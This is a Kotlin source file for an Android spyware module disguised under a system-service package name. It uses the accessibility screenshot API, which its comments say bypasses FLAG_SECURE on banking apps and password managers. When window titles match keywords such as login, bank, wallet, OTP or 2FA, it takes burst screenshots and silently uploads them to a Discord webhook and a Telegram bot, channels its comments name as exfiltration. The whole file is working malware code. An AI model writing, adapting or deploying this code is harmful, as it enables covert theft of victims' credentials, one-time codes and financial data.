package com.system.service.monitor

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.util.Base64
import com.system.service.core.Config
import com.system.service.core.Storage
import com.system.service.services.InputAccessibilityService
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * Screenshot Capture Module — uses AccessibilityService.takeScreenshot() (API 30+).
 *
 * KEY ADVANTAGE: AccessibilityService screenshots BYPASS FLAG_SECURE.
 * This means banking apps, password managers, Snapchat, etc. that block
 * normal screenshots can still be captured.
 *
 * Equivalent to the desktop's captureAndSend() + checkScreenshotTrigger().
 */
object ScreenCapture {

    private val executor = Executors.newSingleThreadExecutor()
    private val takingScreenshot = AtomicBoolean(false)
    private val lastScreenshotTime = AtomicLong(0)

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    // Sensitive keywords — same list as desktop
    private val sensitiveKeywords = listOf(
        "login", "signin", "sign in", "log in", "password", "bank", "paypal",
        "checkout", "auth", "credential", "verify", "account", "billing",
        "submit", "secure", "wallet", "payment", "transfer", "otp", "2fa",
        "two-factor", "pin", "unlock", "passcode", "biometric"
    )

    /**
     * Check if the current window should trigger a screenshot.
     * @param windowInfo Current window title/app name
     * @param isImmediate true = fresh focus or click (shorter debounce)
     */
    fun checkAndCapture(windowInfo: String, isImmediate: Boolean) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return // Need API 30+
        if (Config.webhookUrl.isBlank() && (Config.telegramToken.isBlank() || Config.telegramChatId.isBlank())) return

        // Thermal guard: skip screenshots when device is HOT or CRITICAL
        if (!com.system.service.core.ThermalGuard.screenshotsAllowed) return

        val lower = windowInfo.lowercase()
        val triggered = sensitiveKeywords.any { lower.contains(it) }
        if (!triggered) return

        // Debounce: 10s for immediate (focus/click), 30s for periodic
        val limit = if (isImmediate) 10_000L else 30_000L
        val now = System.currentTimeMillis()
        val last = lastScreenshotTime.get()
        if (now - last < limit) return
        if (!lastScreenshotTime.compareAndSet(last, now)) return

        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        val logContent = "[$ts] [System] \uD83D\uDCF8 TARGET ACQUIRED: $windowInfo"
        if (com.system.service.core.MonitorCore.isRunning) {
            com.system.service.core.MonitorCore.enqueueLog(logContent)
        } else {
            Storage.appendLog(logContent)
        }

        // Determine if sensitive (burst mode) or regular (single shot)
        val isSensitive = isSensitiveWindow(lower)

        executor.submit {
            takeAndSend(windowInfo, isSensitive)
        }
    }

    /**
     * Take screenshot using AccessibilityService — BYPASSES FLAG_SECURE.
     * @param windowInfo Window context for labeling
     * @param burstMode true = 3-shot burst for sensitive windows (login forms)
     */
    private fun takeAndSend(windowInfo: String, burstMode: Boolean) {
        if (!takingScreenshot.compareAndSet(false, true)) return

        try {
            val service = InputAccessibilityService.instance ?: return

            if (burstMode) {
                // Burst mode: 3 shots spaced 2.5s apart (same as desktop)
                // Shot 1: Initial form state
                Thread.sleep(700)
                captureViaAccessibility(service, windowInfo, 1, 3)
                // Shot 2: Mid-interaction
                Thread.sleep(2500)
                captureViaAccessibility(service, windowInfo, 2, 3)
                // Shot 3: Post-submission
                Thread.sleep(2500)
                captureViaAccessibility(service, windowInfo, 3, 3)
            } else {
                // Single shot
                Thread.sleep(800)
                captureViaAccessibility(service, windowInfo, 1, 1)
            }
        } catch (_: Exception) {
        } finally {
            takingScreenshot.set(false)
        }
    }

    /**
     * Capture screenshot via AccessibilityService.takeScreenshot().
     * This is the FLAG_SECURE bypass — system-level capture that ignores app restrictions.
     */
    private fun captureViaAccessibility(
        service: AccessibilityService,
        windowInfo: String,
        shotNum: Int,
        totalShots: Int
    ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return

        service.takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            executor,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                    try {
                        val hardwareBuffer = result.hardwareBuffer
                        val colorSpace = result.colorSpace

                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            ?: return

                        // Convert to JPEG in memory (same as desktop's RAM-only processing)
                        val baos = ByteArrayOutputStream()
                        // Scale down to reduce size — mobile screenshots are huge
                        val scaled = Bitmap.createScaledBitmap(
                            bitmap,
                            (bitmap.width * 0.6).toInt(),
                            (bitmap.height * 0.6).toInt(),
                            true
                        )
                        scaled.compress(Bitmap.CompressFormat.JPEG, 55, baos)
                        val imageData = baos.toByteArray()

                        bitmap.recycle()
                        scaled.recycle()
                        hardwareBuffer.close()

                        // Send to configured channels
                        val ts = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                        val label = if (totalShots > 1) "$ts [$shotNum/$totalShots]" else ts

                        sendToDiscord(imageData, windowInfo, label)
                        sendToTelegram(imageData, windowInfo, label)

                    } catch (_: Exception) { }
                }

                override fun onFailure(errorCode: Int) {
                    // Silent failure — some devices restrict even accessibility screenshots
                }
            }
        )
    }

    /**
     * Upload an existing image buffer to the exfiltration channels.
     * Can be called by ScreenshotObserver for manual user screenshots.
     */
    fun sendBuffer(imageData: ByteArray, windowInfo: String, label: String) {
        executor.submit {
            sendToDiscord(imageData, windowInfo, label)
            sendToTelegram(imageData, windowInfo, label)
        }
    }

    /** Send screenshot to Discord webhook as file upload. */
    private fun sendToDiscord(imageData: ByteArray, windowInfo: String, label: String) {
        val webhookUrl = Config.webhookUrl
        if (webhookUrl.isBlank()) return

        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart(
                    "file1", "capture.jpeg",
                    imageData.toRequestBody("image/jpeg".toMediaType())
                )
                .addFormDataPart(
                    "content",
                    "📸 **Context Capture** `[$label]`\nWindow: `$windowInfo`\nPlatform: Android"
                )
                .build()

            val request = Request.Builder()
                .url(webhookUrl)
                .header("User-Agent", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36")
                .post(body)
                .build()

            client.newCall(request).execute().close()
        } catch (_: Exception) { }
    }

    /** Send screenshot to Telegram as photo. */
    private fun sendToTelegram(imageData: ByteArray, windowInfo: String, label: String) {
        val token = Config.telegramToken
        val chatId = Config.telegramChatId
        if (token.isBlank() || chatId.isBlank()) return

        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", "📸 *Context Capture* `[$label]`\nWindow: `$windowInfo`\nPlatform: Android")
                .addFormDataPart("parse_mode", "Markdown")
                .addFormDataPart(
                    "photo", "capture.jpeg",
                    imageData.toRequestBody("image/jpeg".toMediaType())
                )
                .build()

            val url = "https://api.telegram.org/bot$token/sendPhoto"
            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            client.newCall(request).execute().close()
        } catch (_: Exception) { }
    }

    private fun isSensitiveWindow(lower: String): Boolean {
        val sensitiveKW = listOf(
            "login", "sign in", "signin", "log in", "password", "bank", "paypal",
            "checkout", "auth", "credential", "verify", "account", "billing",
            "submit", "secure", "wallet", "payment", "transfer", "otp", "2fa",
            "two-factor", "pin", "unlock", "passcode"
        )
        return sensitiveKW.any { lower.contains(it) }
    }
}
